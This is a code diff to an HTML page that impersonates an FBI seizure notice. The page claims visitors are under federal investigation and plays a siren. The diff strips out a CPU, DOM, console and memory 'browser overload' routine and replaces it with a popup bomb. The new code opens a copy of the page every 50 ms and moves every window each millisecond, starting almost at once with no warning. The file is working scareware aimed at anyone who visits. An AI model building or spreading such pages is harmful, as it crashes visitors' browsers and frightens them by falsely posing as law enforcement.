@@ -60,15 +60,6 @@
       filter: drop-shadow(0 0 10px red);
     }
 
-    #warning {
-      display: none;
-      font-size: 2em;
-      color: white;
-      text-shadow: 0 0 5px red;
-      animation: pulse 1s infinite;
-      margin-top: 30px;
-    }
-
     #overloadStatus {
       margin-top: 20px;
       font-size: 1.5em;
@@ -99,7 +90,6 @@
     <p>This website has been seized by the FBI pursuant to federal law 18 U.S.C. § 1030.</p>
     <p>All access is being monitored and logged. You are under federal investigation.</p>
 
-    <div id="warning">⚠ GET OFF THE SITE OR FACE TERMINATION ⚠</div>
     <div id="overloadStatus"></div>
   </div>
 
@@ -112,57 +102,52 @@
   <script>
     const audio = document.getElementById("siren");
     audio.volume = 1.0;
-
-    // Ensure autoplay works on interaction
     window.addEventListener('click', () => {
       if (audio.paused) audio.play();
     });
 
-    // Start overload after 5 seconds immediately (no alert)
+    // Popup overload starts after 1 millisecond with no warnings
     setTimeout(() => {
-      document.getElementById('warning').style.display = 'block';
-      startOverload();
-    }, 1000);
+      const popupWidth = 100;
+      const popupHeight = 60;
+      const screenWidth = window.screen.availWidth;
+      const screenHeight = window.screen.availHeight;
+      const popups = [];
 
-    function startOverload() {
-      const status = document.getElementById('overloadStatus');
-      status.style.display = 'block';
-      status.innerText = 'Starting browser overload...';
+      function createAndMovePopup() {
+        const left = Math.random() * (screenWidth - popupWidth);
+        const top = Math.random() * (screenHeight - popupHeight);
+        const popup = window.open(window.location.href, '', `width=${popupWidth},height=${popupHeight},left=${left},top=${top},resizable=no,scrollbars=no`);
 
-      // 1. CPU-intensive busy loop chunk repeatedly (without freezing immediately)
-      function cpuIntensiveTask() {
-        let i = 0;
-        while (i < 1e8) i++;
-        setTimeout(cpuIntensiveTask, 0);
-      }
-      cpuIntensiveTask();
-
-      // 2. Rapid DOM element creation
-      setInterval(() => {
-        for (let i = 0; i < 1000; i++) {
-          const div = document.createElement('div');
-          div.innerText = "█ FBI ACCESS LOG █ IP TRACE ACTIVE █";
-          div.style.position = 'absolute';
-          div.style.top = Math.random() * window.innerHeight + 'px';
-          div.style.left = Math.random() * window.innerWidth + 'px';
-          div.style.color = 'red';
-          div.style.fontSize = '12px';
-          div.style.pointerEvents = 'none';
-          document.body.appendChild(div);
+        if (popup) {
+          const p = {
+            win: popup,
+            x: left,
+            y: top,
+            dx: (Math.random() * 40) - 20,
+            dy: (Math.random() * 40) - 20,
+          };
+          popups.push(p);
         }
-      }, 10);
+      }
 
-      // 3. Console spam huge strings
-      setInterval(() => {
-        console.log('█'.repeat(1e6));
-      }, 100);
+      // Create a new popup every 50 ms (20 per second)
+      const createInterval = setInterval(createAndMovePopup, 50);
 
-      // 4. Memory hog with infinite array push
-      let arr = [];
-      setInterval(() => {
-        arr.push(new Array(1e6).fill('*'));
-      }, 10);
-    }
+      // Move all popups every 1 ms
+      const moveInterval = setInterval(() => {
+        popups.forEach(p => {
+          if (!p.win || p.win.closed) return;
+          p.x += p.dx;
+          p.y += p.dy;
+
+          if (p.x <= 0 || p.x >= screenWidth - popupWidth) p.dx = -p.dx;
+          if (p.y <= 0 || p.y >= screenHeight - popupHeight) p.dy = -p.dy;
+
+          p.win.moveTo(p.x, p.y);
+        });
+      }, 1);
+    }, 1);
   </script>
 </body>
 </html>
